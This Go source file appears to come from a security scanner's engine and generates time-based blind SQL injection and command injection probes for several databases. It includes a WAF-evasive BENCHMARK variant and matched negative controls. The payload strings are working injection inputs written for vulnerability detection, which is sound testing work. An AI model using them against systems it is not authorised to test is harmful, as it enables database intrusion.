package timingblind

import (
	"fmt"
	"regexp"
	"strings"

	"github.com/akha-security/akca/engine/internal/payloadgen"
)

var (
	pgSleepControlRe    = regexp.MustCompile(`(?i)pg_sleep\(\s*\d+\s*\)`)
	sleepControlRe      = regexp.MustCompile(`(?i)(?:sleep|dbms_lock\.sleep)\(\s*\d+\s*\)`)
	waitforControlRe    = regexp.MustCompile(`(?i)waitfor\s+delay\s+'\d+:\d+:\d+'`)
	benchmarkControlRe  = regexp.MustCompile(`(?i)benchmark\(\s*\d+\s*,`)
	randomblobControlRe = regexp.MustCompile(`(?i)randomblob\(\s*\d+\s*\)`)
	xorNowPredicateRe   = regexp.MustCompile(`(?i)now\(\)\s*=\s*sysdate\(\)`)
)

// SQLiPgSleepPayload builds PostgreSQL pg_sleep timing probes.
func SQLiPgSleepPayload(sleepSec int) payloadgen.Payload {
	return payloadgen.Payload{
		Value:                fmt.Sprintf(`'||(SELECT pg_sleep(%d))-- -`, sleepSec),
		VulnClass:            "sqli",
		Variant:              "dynamic_pg_sleep",
		ExpectedSignal:       "timing_postgres_concat",
		VerificationStrategy: "timing_differential",
	}
}

// SQLiSleepPayload builds a time-based SQLi probe with dynamic sleep seconds.
func SQLiSleepPayload(sleepSec int, dbHint string) payloadgen.Payload {
	db := strings.ToLower(dbHint)
	value := fmt.Sprintf(`' AND SLEEP(%d)-- -`, sleepSec)
	signal := "timing_mysql"
	switch {
	case strings.Contains(db, "postgres"):
		value = fmt.Sprintf(`'; SELECT pg_sleep(%d)-- -`, sleepSec)
		signal = "timing_postgres"
	case strings.Contains(db, "mssql") || strings.Contains(db, "sql server"):
		value = fmt.Sprintf(`'; WAITFOR DELAY '0:0:%d'-- -`, sleepSec)
		signal = "timing_mssql"
	case strings.Contains(db, "oracle"):
		value = fmt.Sprintf(`' AND DBMS_LOCK.SLEEP(%d)-- -`, sleepSec)
		signal = "timing_oracle"
	case strings.Contains(db, "sqlite"):
		value = fmt.Sprintf(`' AND 1=randomblob(%d)-- -`, sleepSec*20_000_000)
		signal = "timing_sqlite"
	case strings.Contains(db, "mysql") || strings.Contains(db, "maria"):
		value = fmt.Sprintf(`' AND SLEEP(%d)-- -`, sleepSec)
		signal = "timing_mysql"
	}
	return payloadgen.Payload{
		Value: value, VulnClass: "sqli", Variant: "dynamic_sleep",
		ExpectedSignal: signal, VerificationStrategy: "timing_differential",
	}
}

// SQLiBenchmarkPayload uses MySQL BENCHMARK for WAF-evasive timing when sleep is filtered.
func SQLiBenchmarkPayload(iterations int) payloadgen.Payload {
	if iterations <= 0 {
		iterations = 3_000_000
	}
	return payloadgen.Payload{
		Value:     fmt.Sprintf(`' AND BENCHMARK(%d,MD5(1))-- -`, iterations),
		VulnClass: "sqli", Variant: "dynamic_benchmark",
		ExpectedSignal: "timing_mysql_benchmark", VerificationStrategy: "timing_differential",
	}
}

// CommandSleepPayload builds OS timing probes for command injection.
func CommandSleepPayload(sleepSec int, windows bool) payloadgen.Payload {
	value := fmt.Sprintf(";sleep %d", sleepSec)
	signal := "timing_unix"
	if windows {
		value = fmt.Sprintf("& ping -n %d 127.0.0.1", sleepSec+1)
		signal = "timing_win"
	}
	return payloadgen.Payload{
		Value: value, VulnClass: "command_injection", Variant: "dynamic_sleep",
		ExpectedSignal: signal, VerificationStrategy: "timing_differential",
	}
}

// SQLiZeroDelayPayload returns a benign timing control probe (no intentional delay).
func SQLiZeroDelayPayload(dbHint string) payloadgen.Payload {
	db := strings.ToLower(dbHint)
	value := `' AND SLEEP(0)-- -`
	signal := "timing_zero_mysql"
	switch {
	case strings.Contains(db, "postgres"):
		value = `' AND (SELECT pg_sleep(0))-- -`
		signal = "timing_zero_postgres"
	case strings.Contains(db, "mssql") || strings.Contains(db, "sql server"):
		value = `' AND 1=1-- -`
		signal = "timing_zero_mssql"
	case strings.Contains(db, "oracle"):
		value = `' AND 1=1 FROM dual-- -`
		signal = "timing_zero_oracle"
	}
	return payloadgen.Payload{
		Value: value, VulnClass: "sqli", Variant: "zero_delay_control",
		ExpectedSignal: signal, VerificationStrategy: "timing_differential",
	}
}

// SQLiMatchedZeroDelayPayload preserves the original syntax while replacing
// only the expensive operation. This is a stronger control than a generic
// SLEEP(0) because WAF/parser behavior sees nearly the same request.
func SQLiMatchedZeroDelayPayload(originalValue, dbHint string) payloadgen.Payload {
	value := originalValue
	value = pgSleepControlRe.ReplaceAllString(value, "pg_sleep(0)")
	value = sleepControlRe.ReplaceAllStringFunc(value, func(match string) string {
		if strings.Contains(strings.ToLower(match), "dbms_lock") {
			return "DBMS_LOCK.SLEEP(0)"
		}
		return "SLEEP(0)"
	})
	value = waitforControlRe.ReplaceAllString(value, "WAITFOR DELAY '0:0:0'")
	value = benchmarkControlRe.ReplaceAllString(value, "BENCHMARK(1,")
	value = randomblobControlRe.ReplaceAllString(value, "randomblob(1)")
	if value == originalValue {
		return SQLiZeroDelayPayload(dbHint)
	}
	return payloadgen.Payload{
		Value: value, VulnClass: "sqli", Variant: "matched_zero_delay_control",
		ExpectedSignal: "timing_zero_matched", VerificationStrategy: "timing_differential",
		IsControl: true, IsNegativeControl: true,
	}
}

// SQLiXORFalseConditionControl keeps the expensive SLEEP call unchanged but
// makes the XOR IF predicate deterministically false without a fixed numeric
// marker. It catches WAF/proxy delays caused by the payload shape rather than
// database execution.
func SQLiXORFalseConditionControl(originalValue string) (payloadgen.Payload, bool) {
	if !strings.Contains(strings.ToLower(originalValue), "xor") || !xorNowPredicateRe.MatchString(originalValue) {
		return payloadgen.Payload{}, false
	}
	value := xorNowPredicateRe.ReplaceAllString(originalValue, "now()!=now()")
	return payloadgen.Payload{
		Value: value, VulnClass: "sqli", Variant: "xor_false_condition_control",
		ExpectedSignal: "timing_xor_false_control", VerificationStrategy: "timing_differential",
		IsControl: true, IsNegativeControl: true,
	}, true
}

// IsTimeDelayPayload reports whether a payload intentionally induces delay.
func IsTimeDelayPayload(value, expectedSignal string) bool {
	v := strings.ToLower(value)
	sig := strings.ToLower(expectedSignal)
	if strings.Contains(sig, "timing") || strings.Contains(sig, "time") {
		return true
	}
	for _, marker := range []string{
		"sleep(", "pg_sleep", "waitfor delay", "benchmark(", "dbms_lock.sleep",
		"randomblob", ";sleep", "ping -n",
	} {
		if strings.Contains(v, marker) {
			return true
		}
	}
	return false
}

// RewriteSleepDuration adjusts embedded sleep seconds inside an existing payload.
func RewriteSleepDuration(value string, sleepSec int) string {
	replacements := []struct{ from, to string }{
		{"SLEEP(5)", fmt.Sprintf("SLEEP(%d)", sleepSec)},
		{"SLEEP(6)", fmt.Sprintf("SLEEP(%d)", sleepSec)},
		{"SLEEP(7)", fmt.Sprintf("SLEEP(%d)", sleepSec)},
		{"SLEEP(10)", fmt.Sprintf("SLEEP(%d)", sleepSec)},
		{"sleep(10)", fmt.Sprintf("sleep(%d)", sleepSec)},
		{"sleep(5)", fmt.Sprintf("sleep(%d)", sleepSec)},
		{"sleep(6)", fmt.Sprintf("sleep(%d)", sleepSec)},
		{"pg_sleep(5)", fmt.Sprintf("pg_sleep(%d)", sleepSec)},
		{"pg_sleep(10)", fmt.Sprintf("pg_sleep(%d)", sleepSec)},
		{"pg_sleep(10)", fmt.Sprintf("pg_sleep(%d)", sleepSec)},
		{"'0:0:5'", fmt.Sprintf("'0:0:%d'", sleepSec)},
		{"'0:0:30'", fmt.Sprintf("'0:0:%d'", sleepSec*6)},
		{"DBMS_LOCK.SLEEP(5)", fmt.Sprintf("DBMS_LOCK.SLEEP(%d)", sleepSec)},
		{";sleep 5", fmt.Sprintf(";sleep %d", sleepSec)},
		{"ping -n 5", fmt.Sprintf("ping -n %d", sleepSec+1)},
	}
	out := value
	for _, r := range replacements {
		out = strings.ReplaceAll(out, r.from, r.to)
	}
	return out
}
